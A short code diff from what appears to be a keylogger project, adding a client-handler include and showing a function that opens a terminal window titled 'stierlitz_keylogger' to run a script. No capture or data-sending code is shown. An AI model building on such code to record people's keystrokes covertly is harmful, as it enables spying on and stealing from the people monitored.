@@ -1,4 +1,5 @@
 #include "keylogger.hpp"
+#include "client_handler.hpp"
 
 void Keylogger::spawn_window() {
     execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
